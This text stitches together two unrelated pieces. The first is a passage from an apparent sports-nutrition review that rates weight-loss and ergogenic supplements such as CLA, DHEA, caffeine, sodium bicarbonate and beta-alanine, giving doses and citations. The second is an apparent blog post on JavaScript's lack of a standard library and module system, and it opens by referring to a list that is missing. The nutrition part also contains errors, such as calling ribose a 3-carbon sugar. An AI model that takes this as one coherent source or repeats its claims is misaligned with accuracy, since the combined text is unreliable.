There are some data suggesting that CLA supplementation may modestly promote fat loss and / or increases in lean mass [ 190 –192 , 309–314 ] .
Recent work suggested that CLA supplementation coupled with creatine and whey protein resulted in a increase in strength and lean - tissue mass during resistance training [ 315 ] .
However , other studies indicate that CLA supplementation ( 1.7 to 12 g/d for 4 - weeks to 6 - months ) has limited to no effects on body composition alterations in untrained or trained populations [ 190 , 310 , 316–324 ] .
The reason for the discrepancy in research findings has been suggested to be due to differences in purity and the specific isomer studied .
For instance , early studies in humans showing no effect used CLA that contained all 24 isomers .
Today , most labs studying CLA use 50 - 50 mixtures containing the trans - 10 , cis -12 and cis -9 , trans - 11 isomers , the former of which being recently implicated in positively altering body composition .
This has been supported by recent work indicating that CLA ( 50:50 cis - 9 , trans - 11 : trans - 10 , cis - 12 ) plus polyunsaturated fatty acid supplementation prevented abdominal fat increases and increase fat - free mass [ 325 ] .
However , it must be noted that this response only occurred in young obese individuals .
Thus , CLA supplementation may have potential in the areas of general health and it is clear that research on the effects on body composition is ongoing and still quite varied .
Further research is needed to determine which CLA isomer is ideal for ingestion and possibly if there are differential responses among lean or obese and old or young populations .
Too Early to Tell
Gymnema Sylvestre
Gymnema Sylvestre is a supplement that is purported to regulate weight loss and blood sugar levels .
It is purported to affect glucose and fat metabolism as well as inhibit sweet cravings .
In support of these contentions , some recent data have been published by Shigematsu and colleagues [ 326 , 327 ] showing that short and long - term oral supplementation of gymnema sylvestre in rats fed normal and high - fat diets may have some positive effects on fat metabolism , blood lipid levels , and / or weight gain / fat deposition .
More recent work in rats has shown that gymnema sylvestre supplementation promoted weight loss by reducing hyperlipidemia [ 328 ] .
The only apparent clinical trial in humans showed that an herbal combination group containing 400 mg of gymnema sylvestra resulted in effective and safe weight loss while promoting improved blood lipid profiles .
It should be noted that this group was not significantly different that the other active group , containing HCA , when observing these dependent variables [ 329 ] .
Due to the lack of substantial positive research on the effects of gymnema sylvestre supplementation in humans , we cannot recommend gymnema sylvestre as a supplement to positively affect weight loss .
Phosphatidyl Choline ( Lecithin )
Choline is considered an essential nutrient that is needed for cell membrane integrity and to facilitate the movement of fats in and out of cells .
It is also a component of the neurotransmitter acetylcholine and is needed for normal brain functioning , particularly in infants .
For this reason , phosphatidyl choline ( PC ) has been purported as a potentially effective supplement to promote fat loss as well as improve neuromuscular function .
However , despite these alleged benefits of lecithin supplementation , there are no clinical trials in humans to support a potential role of lecithin supplementation affecting weight loss .
Betaine
Betaine is a compound that is involved in the metabolism of choline and homocysteine .
Garcia Neto et al. [ 330 ] have shown that betaine feedings can effect liver metabolism , fat metabolism , and fat deposition in chickens .
Betaine supplementation may also help lower homocysteine levels which is a marker of risk to heart disease [ 331 ] .
For this reason , betaine supplements have been marketed as a supplement designed to promote heart health as well as a weight loss .
A recent study by Hoffman and colleagues [ 332 ] found betaine supplementation to improve muscular endurance in active college age males .
Despite this , there appears to be little evidence in human models that supports the role of betaine as a supplement for weight loss and thus it is not recommended for supplementation .
Coleus Forskohlii ( Forskolin )
Forskolin , which is touted as a weight loss supplement is a plant native to India that has been used for centuries in traditional Ayurvedic medicine primarily to treat skin disorders and respiratory problems [ 333 , 334 ] .
A considerable amount of research has evaluated the physiological and potential medical applications of forskolin over the last 25 years .
Forskolin has been reported to reduce blood pressure , increase the hearts ability to contract , help inhibit platelet aggregation , improve lung function , and aid in the treatment of glaucoma [ 333–335 ] .
With regard to weight loss , forskolin has been reported to increase cyclic AMP and thereby stimulate fat metabolism [ 336–338 ] .
Theoretically , forskolin may therefore serve as an effective weight loss supplement .
Recent evidence has shown that forskolin supplementation had no effect on improving body composition in mildly obese women [ 339 ] .
In contrast , work done by Godard et al. in 2005 reported that 250 mg of a 10 % forskolin extract taken twice daily resulted in improvements in body composition in overweight and obese men [ 340 ] .
Another study suggested that supplementing the diet with coleus forskohlii in overweight women helped maintain weight and was not associated with any clinically significant adverse events [ 341 ] .
Currently , research is still needed on forskolin supplementation before it can be recommended as an effective weight loss supplement .
Dehydroepiandrosterone ( DHEA ) and 7 - Keto DHEA
Dehydroepiandrosterone ( DHEA ) and its sulfated conjugate DHEAS represent the most abundant adrenal steroids in circulation [ 342 ] .
Although , DHEA is considered a weak androgen , it can be converted to the more potent androgens testosterone and dihydrotestosterone in tissues .
In addition , DHEAS can be converted into androstenedione and testosterone .
DHEA levels have been reported to decline with age in humans [ 343 ] .
The decline in DHEA levels with aging has been associated with increased fat accumulation and risk to heart disease [ 344 ] .
Since DHEA is a naturally occurring compound , it has been suggested that dietary supplementation of DHEA may help maintain DHEA availability , maintain and / or increase testosterone levels , reduce body fat accumulation , and / or reduce risk to heart disease as one ages [ 342 , 344 ] .
Although animal studies have generally supported this theory , the effects of DHEA supplementation on body composition in human trials have been mixed .
For example , Nestler and coworkers [ 345 ] reported that DHEA supplementation ( 1,600 mg/d for 28 - d ) in untrained healthy males promoted a 31 % reduction in percentage of body fat .
However , Vogiatzi and associates [ 346 ] reported that DHEA supplementation ( 40 mg/d for 8 wks ) had no effect on body weight , percent body fat , or serum lipid levels in obese adolescents .
More recent work has supported these findings suggesting that one year of DHEA supplementation had no effect on body composition when taken at 50 mg per day [ 347 ] .
7 - keto DHEA , a DHEA precursor , has been marketed as a potentially more effective form of DHEA which is believed to possess lypolytic properties .
Although data are limited , Kalman and colleagues and coworkers [ 348 ] reported that 7 - keto DHEA supplementation ( 200 mg /d ) during 8 - weeks of training promoted a greater loss in body mass and fat mass while increasing T3 while observing no significant effects on thyroid stimulating hormone ( TSH ) or T4 .
More recent data has shown that 7 - keto DHEA supplementation can increase RMR [ 349 ] and blunt the decrease in RMR associated with 8 weeks of restricted dieting [ 350 ] .
However , it must be noted that the second study did not use isolated 7 - keto DHEA but used a commercial weight loss product that contained DHEA as well as other known weight loss agents ( i.e. caffeine , green tea extract , citrus aurantium , etc. ) .
Thus , these results do not directly support the use of 7 - keto DHEA .
Although more research is needed on the effects of supplementing DHEA by itself as a weight loss agent , these findings provide minimal support that 7 - keto DHEA may serve as an effective weight loss supplement .
Psychotropic Nutrients / Herbs
Psychotropic nutrients / herbs are a new class of supplements that often contain things like St. John 's Wart , Kava , Ginkgo Biloba , Ginseng , and L - Tyrosine .
They are believed to serve as naturally occurring antidepressants , relaxants , and mental stimulants thus the theoretical rationale regarding weight loss is that they may help people fight depression or maintain mental alertness while dieting .
There are no clinical weight loss trials that utilize any of the above nutrients / herbs as the active ingredient in the supplementation trial .
Although a number of studies support potential role as naturally occurring psychotropics or stimulants , the potential value in promoting weight loss is unclear and therefore are not recommended for supplementation .
Apparently Ineffective
Calcium Pyruvate
Calcium Pyruvate is supplement that hit the scene about 10 - 15 ago with great promise .
The theoretical rationale was based on studies from the early 1990s that reported that calcium pyruvate supplementation ( 16 - 25 g/d with or without dihydroxyacetone phosphate [ DHAP ] ) promoted fat loss in overweight / obese patients following a medically supervised weight loss program [ 351–353 ] .
Although the mechanism for these findings was unclear , the researchers speculated that it might be related to appetite suppression and / or altered carbohydrate and fat metabolism .
Since calcium pyruvate is very expensive , several studies have attempted to determine whether ingesting smaller amounts of calcium pyruvate ( 6 - 10 g/d ) affect body composition in untrained and trained populations .
Results of these studies are mixed .
Earlier studies have shown both a positive effect on calcium pyruvate supplementation in improving body composition [ 354 ] , however , Stone and colleagues [ 355 ] reported that pyruvate supplementation did not affect hydrostatically determined body composition during 5 - weeks of in - season college football training .
More recently , calcium pyruvate supplementation was also shown to not have a significant effect on body composition or exercise performance .
Additionally , it has been reported that supplementation may negatively affect some blood lipid levels [ 356 ] .
These findings indicate that although there is some supportive data indicating that calcium pyruvate supplementation may enhance fat loss when taken at high doses ( 6 - 16 g/d ) , there is no evidence that ingesting the doses typically found in pyruvate supplements ( 0.5 - 2 g/d ) has any affect on body composition .
In addition , the overall quantity of research examining calcium pyruvate is minimal at best thus it is not warranted to include calcium pyruvate as a weight loss supplement .
Chitosan
Chitosan has been marketed as a weight loss supplement for several years as is known as a " fat trapper " .
It is purported to inhibit fat absorption and lower cholesterol .
This notion is supported animal studies indicated by decreased fat absorption , increased fat content , and / or lower cholesterol following chitosan feedings [ 357–360 ] .
However , the effects in humans appear to be less impressive .
For example , although there is some data suggesting that chitosan supplementation may lower blood lipids in humans , [ 361 ] other studies report no effects on fat content [ 362 , 363 ] or body composition alterations [ 364–366 ] when administered to people following their normal diet .
More recent work has shown that the effect of chitosan on fat absorption is negligible and is the equivalent of approximately 9.9 kcal / day following supplementation [ 362 ] .
Other work has concluded that the insignificant amounts of fat that are trapped from supplementation would take about 7 months for a male to lose a pound of weight , and that the effect was completely ineffective in women [ 364 ] .
Thus , based on the current evidence , chitosan supplementation is apparently ineffective and has no significant effects on " fat trapping " and / or on improving body composition .
Chromium
Chromium supplementation is derived from its role in maintaining proper carbohydrate and fat metabolism by potentially effecting insulin signalling [ 367 ] .
Initial studies reported that chromium supplementation during resistance training improved fat loss and gains in lean body mass [ 173 –175 ] .
To date , the studies using more accurate methods of assessing body composition have primarily indicate no effects on body composition in healthy non-diabetic individuals [ 176–183 , 368 ] .
Recent work has reported that 200 mcg of chromium picolinate supplementation on individuals on a restrictive diet did not promote weight loss or body composition changes following 12 weeks of supplementation [ 368 ] .
This work supports Lukaski et al [ 182 ] previous findings that 8 - weeks of chromium supplementation during resistance training did not affect strength or DEXA determined body composition changes .
Thus , based on the current review of the literature we cannot recommend chromium supplementation as a means of improving body composition .
Garcinia Cambogia ( HCA )
HCA is a nutrient that has been hypothesized to increase fat oxidation by inhibiting citrate lypase and lipogenesis [ 369 ] .
Theoretically , this may lead to greater fat burning and weight loss over time .
Although there is some evidence that HCA may increase fat metabolism in animal studies , there is little to no evidence showing that HCA supplementation affects body composition in humans .
For example , Ishihara et al [ 370 ] reported that HCA supplementation spared carbohydrate utilization and promoted lipid oxidation during exercise in mice .
However , Kriketos and associates [ 371 ] reported that HCA supplementation ( 3 g/d for 3 - days ) did not affect resting or post - exercise energy expenditure or markers of lipolysis in healthy men .
Likewise , Heymsfield and coworkers [ 372 ] reported that HCA supplementation ( 1.5 g/d for 12 - weeks ) while maintaining a low fat / high fiber diet did not promote greater weight or fat loss than subjects on placebo .
Finally , Mattes and colleagues [ 373 ] reported that HCA supplementation ( 2.4 g/d for 12 - weeks ) did not affect appetite , energy intake , or weight loss .
These findings suggest that HCA supplementation does not appear to promote fat loss in humans .
L- Carnitine
Carnitine serves as an important transporter of fatty acids from the cytosol into the mitochondria of the cell [ 374 ] .
Increased cellular levels of carnitine would theoretically enhance transport of fats into the mitochondria and thus provide more substrates for fat metabolism .
L - carnitine has been one of the most common nutrients found in various weight loss supplements .
Over the years , a number of studies have been conducted on the effects of L - carnitine supplementation on fat metabolism , exercise capacity and body composition .
The overwhelming conclusions of L - carnitine research indicates that L - carnitine supplementation does not affect muscle carnitine content [ 375 ] , fat metabolism , aerobic - or anaerobic - exercise performance [ 375 ] , and / or weight loss in overweight or trained subjects [ 376 , 377 ] .
Despite the fact that L - carnitine has been shown apparently ineffective as a supplement , the research on L - carnitine has shifted to another category revolving around hypoxic stress and oxidative stress .
Preliminary research has reported that L - carnitine supplementation has a minimal effect on reducing the biomarkers of exercise - induced oxidative stress [ 378 ] .
While these findings are not promising , there is some recent data indicating that L - carnitine tartrate supplementation during intensified periods of training may help athletes tolerate training to a greater degree [ 379 ] .
Consequently , there may be other advantages to L - carnitine supplementation than promoting fat metabolism .
Phosphates
The role of sodium and calcium phosphate on energy metabolism and exercise performance has been studied for decades [ 31 ] .
Phosphate supplementation has also been suggested to affect energy expenditure , however , the research in this area is quite dated and no research on the effects on energy expenditure have been conducted .
Some of this dated work includes the work by Kaciuba - Uscilko and colleagues [ 380 ] who reported that phosphate supplementation during a 4 - week weight loss program increased resting metabolic rate ( RMR ) and respiratory exchange ratio ( suggesting greater carbohydrate utilization and caloric expenditure ) during submaximal cycling exercise .
In addition , Nazar and coworkers [ 381 ] reported that phosphate supplementation during an 8 - week weight loss program increased RMR by 12 - 19 % and prevented a normal decline in thyroid hormones .
Although the rate of weight loss was similar in this trial , results suggest that phosphate supplementation may influence metabolic rate possibly by affecting thyroid hormones .
Despite these to dated trials , no further research has been conducted and thus the role of phosphates in regards to weight loss is inconclusive at best .
Herbal Diuretics
This is a new type of supplement recently marketed as a natural way to promote weight loss .
There is limited evidence that taraxacum officinale , verbena officinalis , lithospermum officinale , equisetum arvense , arctostaphylos uva-ursi , arctium lappa and silene saxifraga infusion may affect diuresis in animals [ 382 , 383 ] .
Two studies presented at the 2001 American College of Sports Medicine meeting [ 384 , 385 ] indicated that although herbal diuretics promoted a small amount of dehydration ( about 0.3 % in one day ) , they were not nearly as effective as a common diuretic drug ( about 3.1 % dehydration in one day ) .
Consequently , although more research is needed , the potential value of herbal diuretics as a weight loss supplement appears limited .
Performance Enhancement Supplements
A number of nutritional supplements have been proposed to enhance exercise performance .
Some of these nutrients have been described above .
Table 3 categorizes the proposed ergogenic nutrients into apparently safe and effective , possibly effective , too early to tell , and apparently ineffective .
Weight gain supplements purported to increase muscle mass may also have ergogenic properties if they also promote increases in strength .
Similarly , some sports may benefit from reductions in fat mass .
Therefore , weight loss supplements that help athletes manage body weight and / or fat mass may also possess some ergogenic benefit .
The following describes which supplements may or may not affect performance that were not previously described .
Apparently Effective
Water and Sports Drinks
Preventing dehydration during exercise is one of the keys of maintaining exercise performance ( particularly in hot / humid environments ) .
People engaged in intense exercise or work in the heat need to frequently ingest water or sports drinks ( e.g. , 1 - 2 cups every 10 - 15 minutes ) .
The goal should be not to lose more than 2 % of body weight during exercise ( e.g. , 180 lbs × 0.02 = 3.6 lbs ) .
Sports drinks typically contain salt and carbohydrate at scientifically engendered quantities .
Studies show that ingestion of sports drinks during exercise in hot / humid environments can help prevent dehydration and improve endurance exercise capacity [ [ 56 ] , von Duvillard 2005 ) , [ 386 , 387 ] ] .
In fact , research has shown that carbohydrate intake during team sport type activities can increase exercise performance and CNS function [ 15 , 16 , 388 ] .
Consequently , frequent ingestion of water and / or sports drinks during exercise is one of the easiest and most effective ergogenic aids .
Carbohydrate
One of the best ergogenic aids available for athletes and active individuals alike , is carbohydrate .
Athletes and active individuals should consume a diet high in carbohydrate ( e.g. , 55 - 65 % of calories or 5 - 8 grams / kg / day ) in order to maintain muscle and liver carbohydrate stores [ 1 , 3 ] .
Research has clearly identified carbohydrate is an ergogenic aid that can prolong exercise [ 3 ] .
Additionally , ingesting a small amount of carbohydrate and protein 30 - 60 minutes prior to exercise and use of sports drinks during exercise can increase carbohydrate availability and improve exercise performance .
Finally , ingesting carbohydrate and protein immediately following exercise can enhance carbohydrate storage and protein synthesis [ 1 , 3 ] .
Creatine
Earlier we indicated that creatine supplementation is one of the best supplements available to increase muscle mass and strength during training .
However , creatine has also been reported to improve exercise capacity in a variety of events [ [ 71 ] , Kendall 2005 , [ 389–391 ] ] .
This is particularly true when performing high intensity , intermittent exercise such as multiple sets of weight lifting , repeated sprints , and / or exercise involving sprinting and jogging ( e.g. , soccer ) [ 71 ] .
Creatine has also been shown to be effective at improving high intensity interval training .
A 2009 study found that in addition to high intensity interval training creatine improved critical power [ 390 ] .
Although studies evaluating the ergogenic value of creatine on endurance exercise perfor mance are mixed , endurance athletes may also theoretically benefit in several ways .
For example , increasing creatine stores prior to carbohydrate loading ( i.e. , increasing dietary carbohydrate intake before competition in an attempt to maximize carbohydrate stores ) has been shown to improve the ability to store carbohydrate [ 392–394 ] .
A 2003 study found that ingesting 20 grams of creatine for 5 days improved endurance and anaerobic performance in elite rowers [ 395 ] .
Further , co ingesting creatine with carbohydrate has been shown to optimize creatine and carbohydrate loading [ 396 ] .
Most endurance athletes also perform interval training ( sprint or speed work ) in an attempt to improve anaerobic threshold .
Since creatine has been reported to enhance interval sprint performance , creatine supplementation during training may improve training adaptations in endurance athletes [ 397 , 398 ] .
Finally , many endurance athletes lose weight during their competitive season .
Creatine supplementation during training may help people maintain weight .
Sodium Phosphate
We previously mentioned that sodium phosphate supplementation may increase resting energy expenditure and therefore could serve as a potential weight loss nutrient .
However , most research on sodium phosphate has actually evaluated the potential ergogenic value .
A number of studies indicated that sodium phosphate supplementation ( e.g. , 1 gram taken 4 times daily for 3 - 6 days ) can increase maximal oxygen uptake ( i.e. , maximal aerobic capacity ) and anaerobic threshold by 5 - 10 % [ 399–403 ] .
These finding suggest that sodium phosphate may be highly effective in improving endurance exercise capacity .
In addition to endurance enhancement , sodium phosphate loading improved mean power output and oxygen uptake in trained cyclist in a 2008 study [ 404 ] .
Other forms of phosphate ( i.e. , calcium phosphate , potassium phosphate ) do not appear to possess ergogenic value .
Sodium Bicarbonate ( Baking Soda )
During high intensity exercise , acid ( H+ ) and carbon dioxide ( CO 2 ) accumulate in the muscle and blood .
One of the ways you get rid of the acidity and CO 2 is to buffer the acid and CO 2 with bicarbonate ions .
The acid and CO 2 are then removed in the lungs .
Bicarbonate loading ( e.g. , 0.3 grams per kg taken 60 - 90 minutes prior to exercise or 5 grams taken 2 times per day for 5 - days ) has been shown to be an effective way to buffer acidity during high intensity exercise lasting 1 - 3 minutes in duration [ 405 –408 ] .
This can improve exercise capacity in events like the 400 - 800 m run or 100 - 200 m swim [ 409 ] .
In elite male swimmers sodium bicarbonate supplementation significantly improved 200 m freestyle performance [ 410 ] .
A 2009 study found similar improvements in performance in youth swimmers at distances of 50 to 200 m .
Although bicarbonate loading can improve exercise , some people have difficulty with their stomach tolerating bicarbonate as it may cause gastrointestinal distress .
Caffeine
Caffeine is a naturally derived stimulant found in many nutritional supplements typically as gaurana , bissey nut , or kola .
Caffeine can also be found in coffee , tea , soft drinks , energy drinks , and chocolate .
It has previously been made clear that caffeine can have a positive effect on energy expenditure , weight loss , and body fat .
Caffeine has also been shown to be an effective ergogenic aid .
Research investigating the effects of caffeine on a time trial in trained cyclist found that caffeine improved speed , peak power , and mean power [ 411 ] .
Similar results were observed in a recent study that found cyclists who ingested a caffeine drink prior to a time trial demonstrated improvements in performance [ 412 , 413 ] .
Studies indicate that ingestion of caffeine ( e.g. , 3 - 9 mg/kg taken 30 - 90 minutes before exercise ) can spare carbohydrate use during exercise and thereby improve endurance exercise capacity [ 406 , 414 ] .
In addition to the apparent positive effects on endurance performance , caffeine has also been shown to improve repeated sprint performance benefiting the anaerobic athlete [ 415 , 416 ] .
People who drink caffeinated drinks regularly , however , appear to experience less ergogenic benefits from caffeine [ 417 ] .
Additionally , some concern has been expressed that ingestion of caffeine prior to exercise may contribute to dehydration although recent studies have not supported this concern [ 414 , 418 , 419 ] .
Caffeine doses above 9 mg / kg can result in urinary caffeine levels that surpass the doping threshold for many sport organizations .
Suggestions that there is no ergogenic value to caffeine supplementation is not supported by the preponderance of available scientific studies .
β- alanine
In recent years research has begun investigating the effects of β- alanine supplementation on performance .
β- alanine has ergogenic potential based on its relationship with carnosine .
Carnosine is a dipeptide comprised of the amino acids , histidine and β- alanine naturally occurring in large amounts in skeletal muscles .
Carnosine is believed to be one of the primary muscle - buffering substances available in skeletal muscle .
Studies have demonstrated that taking β- alanine orally over a 28 - day period was effective in increasing carnosine levels [ 420 , 421 ] .
This proposed benefit would increase work capacity and decrease time to fatigue .
Researchers have found that β- alanine supplementation decreases rate of fatigue [ 422 ] .
This could translate into definite strength gains and improved performance .
A recent study [ 423 ] supplemented men with β- alanine for 10 weeks and showed that muscle carnosine levels were significantly increased after 4 and 10 weeks of β- alanine supplementation .
Stout et al. [ 422 ] conducted a study that examined the effects of β- alanine supplementation on physical working capacity at fatigue threshold .
The results showed decreased fatigue in the subjects tested .
Other studies have shown that β- alanine supplementation can increase the number of repetitions one can do [ 424 ] , increased lean body mass [ 425 ] , increase knee extension torque [ 426 ] and training volume [ 427 ] .
In fact , one study also showed that adding β- alanine supplementation with creatine improves performance over creatine alone [ 428 ] .
While it appears that β- alanine supplementation can decrease fatigue rate , raise carnosine levels , and improve performance all of the research is not as favorable .
There are other studies that show no performance benefits [ 425 , 429 ]
Possibly Effective
Post - Exercise Carbohydrate and Protein
Ingesting carbohydrate and protein following exercise enhances carbohydrate storage and protein synthesis .
Theoretically , ingesting carbohydrate and protein following exercise may lead to greater training adaptations .
In support of this theory , Esmarck and coworkers [ 107 ] found that ingesting carbohydrate and protein immediately following exercise doubled training adaptations in comparison to waiting until 2 - hours to ingest carbohydrate and protein .
Additionally , Tarnopolsky and associates [ 430 ] reported that post - exercise ingestion of carbohydrate with protein promoted as much strength gains as ingesting creatine with carbohydrate during training .
A recent study by Kreider and colleagues [ 431 ] found that protein and carbohydrate supplementation post workout was capable of positively supporting the post exercise anabolic response .
In the last few years many studies have agreed with these findings in that post workout supplementation is vital to recovery and training adaptations [ 13 , 104 , 431–433 ] .
These findings underscore the importance of post - exercise carbohydrate and protein ingestion to support muscle anabolism and strength .
However , it is still unclear if there are direct implications of protein / carbohydrate supplementation on other markers of performance such as time to exhaustion , maximal oxygen uptake , and / or skill development .
Essential Amino Acids ( EAA )
Ingestion of 3 - 6 grams of EAA following resistance exercise has been shown to increase protein synthesis [ 92 , 93 , 98–102 , 105 , 434 ] .
Theoretically , ingestion of EAA after exercise should enhance gains in strength and muscle mass during training .
While there is sound theoretical rationale , it is currently unclear whether following this strategy would lead to greater training adaptations and / or whether EAA supplementation would be better than simply ingesting carbohydrate and a quality protein following exercise .
Branched Chain Amino Acids ( BCAA )
Ingestion of BCAA ( e.g. , 6 - 10 grams per hour ) with sports drinks during prolonged exercise would theoretically improve psychological perception of fatigue ( i.e. , central fatigue ) .
Although there is strong rationale , the effects of BCAA supplementation on exercise performance is mixed with some studies suggesting an improvement and others showing no effect [ 33 ] .
More research is needed before conclusions can be drawn .
β-HMB
HMB supplementation has been reported to improve training adaptations in untrained individuals initiating training as well as help reduce muscle breakdown in runners .
Theoretically , this should enhance training adaptations in athletes .
However , most studies show little benefit of HMB supplementation in athletes .
A 2004 study by Hoffman [ 435 ] found HMB supplementation to be ineffective in collegiate football players after short term supplementation .
It has been hypothesized that HMB will delay or prevent muscle damage ; however this has limited evidence as suggested in previous sections .
There are a few studies that have been positive [ 115 ] .
A 2009 study found that HMB supplementation did positively affect strength in trained men [ 436 ] .
While HMB supplementation may still have some scientific rationale there is little evidence that is can directly affect performance in moderately trained subjects .
Glycerol
Ingesting glycerol with water has been reported to increase fluid retention [ 437 ] .
Theoretically , this should help athletes prevent dehydration during prolonged exercise and improve performance particularly if they are susceptible to dehydration .
Although studies indicate that glycerol can significantly enhance body fluid , results are mixed on whether it can improve exercise capacity [ 69 , 438–443 ] .
Little research has been done on glycerol in the last five years however , a 2006 study agreed with previous findings in that glycerol has little impact on performance [ 444 ] .
Too Early to Tell
A number of supplements purported to enhance performance and / or training adaptation fall under this category .
This includes the weight gain and weight loss supplements listed in Table 3 as well as the following supplements not previously described in this category .
Medium Chain Triglycerides ( MCT )
MCT's are shorter chain fatty acids that can easily enter the mitochondria of the cell and be converted to energy through fat metabolism [ 445 ] .
Studies are mixed as to whether MCT 's can serve as an effective source of fat during exercise metabolism and / or improve exercise performance [ 445–449 ] .
A 2001 study found that 60 g/ day of MCT oil for two weeks was not sufficient at improving performance [ 450 ] .
In fact Goedecke found that not only did MCT supplementation not improve performance , but , actually negatively affected sprint performance in trained cyclists [ 451 ] .
These findings have been confirmed by others that MCT oils are not sufficient to induce positive training adaptations and may cause gastric distress [ 452 , 453 ] .
It must be noted that while most studies have not been favourable , one 2009 study found that MCT oil may positively affect RPE and lactate clearance [ 454 ] .
It does not appear likely that MCT can positively affect training adaptations , but further research is needed .
Apparently Ineffective
Glutamine
As described above , glutamine has been shown to influence protein synthesis and help maintain the immune system .
Theoretically , glutamine supplementation during training should enhance gains in strength and muscle mass as well as help athletes tolerate training to a better degree .
Although there is some evidence that glutamine supplementation with protein can improve training adaptations , more research is needed to determine the ergogenic value in athletes .
There is currently no research to suggest that glutamine has a direct effect on performance .
Ribose
Ribose is a 3 - carbon carbohydrate that is involved in the synthesis of adenosine triphosphate ( ATP ) in the muscle ( the useable form of energy ) .
Clinical studies have shown that ribose supplementation can increase exercise capacity in heart patients [ 455–459 ] .
For this reason , ribose has been suggested to be an ergogenic aid for athletes .
Although more research is needed , most studies show no ergogenic value of ribose supplementation on exercise capacity in health untrained or trained populations [ 460 –462 ] .
A 2006 study [ 463 ] investigated the effects of ribose vs. dextrose on rowing performance .
After eight weeks of supplementation dextrose had a better response than ribose across the subjects [ 463 ] .
Kreider and associates [ 462 ] and Kersick and colleagues [ 464 ] investigated ribose supplementation on measures of anaerobic capacity in trained athletes .
This research group found that ribose supplementation did not have a positive impact on performance [ 462 , 464 ] .
It appears at this point that ribose supplementation does not improve aerobic or anaerobic performance .
Inosine
Inosine is a building block for DNA and RNA that is found in muscle .
Inosine has a number of potentially important roles that may enhance training and / or exercise performance [ 465 ] .
Although there is some theoretical rationale , available studies indicate that inosine supplementation has no apparent affect on exercise performance capacity [ 466–468 ] .
Supplements to Promote General Health
In addition to the supplements previously described , several nutrients have been suggested to help athletes stay healthy during intense training .
For example , the American Medical Association recently recommended that all Americans ingest a daily low - dose multivitamin in order to ensure that people get a sufficient amount of vitamins and minerals in their diet .
Although one - a - day vitamin supplementation has not been found to improve exercise capacity in athletes , it may make sense to take a daily vitamin supplement for health reasons .
Glucosomine and chondroitin have been reported to slow cartilage degeneration and reduce the degree of joint pain in active individuals which may help athletes postpone and / or prevent joint problems [ 469 , 470 ] .
Supplemental Vitamin C , glutamine , echinacea , and zinc have been reported to enhance immune function [ 471–474 ] .
Consequently , some sports nutritionists recommend that athletes who feel a cold coming on take these nutrients in order to enhance immune function [ 55 , 471–473 ] .
Similarly , although additional research is necessary , Vitamin E , Vitamin C , selenium , alpha-lipoic acid and other antioxidants may help restore overwhelmed anti-oxidant defences exhibited by athletes and reduce the risk of numerous chronic diseases in some instances [ 475 ] .
Creatine , calcium β- HMB , BCAA , and L - carnitine tartrate have been shown to help athletes tolerate heavy training periods [ 31 , 118 , 125 , 126 , 128 , 379 , 476–478 ] .
Finally , the omega - 3 fatty acids docosahexaenoic acid ( DHA ) and eicosapantaenoic acid ( EPA ) , in supplemental form , are now endorsed by the American Heart Association for heart health in certain individuals [ 479 ] .
This supportive supplement position stems from : 1. ) an inability to consume cardio - protective amounts by diet alone ; and , 2 . ) the mercury contamination sometimes present in whole - food sources of DHA and EPA found in fatty fish .
Consequently , prudent use of these types of nutrients at various times during training may help athletes stay healthy and / or tolerate training to a greater degree [ 50 ] .

Recognize that ?
Yes indeed , it ’s the complete list of standard Javascript objects of Javascript 1.5. 16 objects , of which 7 are error objects .
Of course , this is just the Javascript language by itself .
In practice Javascript executes inside a browser , which gives it access to additional objects like the DOM , and all kinds of fancy HTML5 and non-standard browser - specific features .
When Javascript was just a little language that people would use to do simple mouse - over events , this was not a problem .
However , now , more and more applications are written in Javascript in the browser and Javascript is used in more and more places other than the browser .
Better yet I dare to bet you that in a few years time Javascript is going to be one of the most used programming languages in a growing number of domains .
The growing body of Javascript code also means Javascript needs more than just those 16 objects .
It needs a larger standard API and it needs a standardized way to modularize code .
At the very least it needs a de-facto standard way of doing object - oriented programming , having the choice between classical , prototypal , or , sure , why not lazy inheritance is not doing it for me .
Different libraries use different styles .
Worse yet , different libraries develop their own utility objects to produce classes , and if they ’d at least agree on a common way of doing that , but no , there are a few dozen different way of implementing exactly the kind of inheritance you like .
I ’m not the biggest fan of Java , but at least they made a decision on this at the language level .
But I ’m getting side tracked .
The main two things Javascript needs to be a proper language that we can apply “ grown - up ” software engineering principles to :
A standard library A module system
First , the standard library .
Those 16 objects are no longer sufficient .
So , what happens is that programmers step in to build a larger , more extensive library of objects .
It would be great if they all teamed up to come with the one framework that everybody uses , but of course they did n’t , so we now have Prototype , MooTools , jQuery , MochiKit , ExtJS , YUI , Google Closure , and I ’m probably forgetting about a dozen .
This divides the Javascript world into different camps .
Either you ’re a jQuery guy or a Prototype guy , a ExtJS guy or a Moch Kit guy .
There ’s a YUI -y way of doing things and a Prototype way of doing things .
There ’s a jQuery calendar , an ExtJS calendar , and a Prototype calendar .
Of course , once you picked a framework you stick to it , because if I want to use a prototype calendar from my jQuery application , I have to pull in x kilobytes of additional code that essentially duplicates jQuery functionality .
A lot of effort is wasted because of this .
What Javascript ’s standard library should contain is pretty tough thing to determine .
First thing that comes to mind is a set of standard data structures .
Of course Javascript has arrays and objects .
Objects are typically also used as maps ( although the keys can only be strings , and not even all strings ) and sometimes even as set ( where the property names represent values ) .
A better library of data structures is required , including a proper map and set implementation .
Additionally , APIs for other common tasks such as :
JSON parsing and serialization
Testing
Cryptography
Date handling
DOM querying ( I think most libraries agree that CSS selectors are a good way , right ? )
Some stuff like DOM traversals , querying and widgets will be hard to agree on probably , but would be nice to have .
Because Javascript is increasingly being used as a non -browser language , for instance on servers , it will also need non -browser stuff like IO , inter - process communication , sockets etc .
The CommonJS initiative is working on these .
CommonJS is an initiative , mostly among Javascript server vendors , to agree upon certain standard interfaces to , e.g. IO , threads , sockets etc .
Its main contribution to date , however , is its module system .
Javascript does not have namespaces , but you can use objects for this purpose .
That ’s fine .
In the past , some frameworks have built their own module system around this .
Dojo and Google Closure offer a remarkably similar API to export and load modules :
dojo.require(‘ dijit.widget.Editor ’ ) ;
dojo.require(‘myproj.Something ’) ;
dojo.provide(‘myproj.MyObj’ ) ;
myproj .MyObj = function ( ) { } ;
myproj.MyObj.prototype.initialize = function ( ) { … } ;
Replace ‘ dojo ’ by ‘ goog ’ and you basically have the Google Closure version .
Quite nice and reasonably clean .
However , there ’s also JSAN ’s module system .
CommonJS ’s module system is really nice , however according to some reports cannot be implemented in the browser properly .
There ’s an asynchronous version of the CommonJS module system called RequireJS , but , well , it ’s not the CommonJS standard .
There ’s a proposal to standardize the RequireJS system as part of CommonJS , but it ’s not entirely clear what the status is of that proposal .
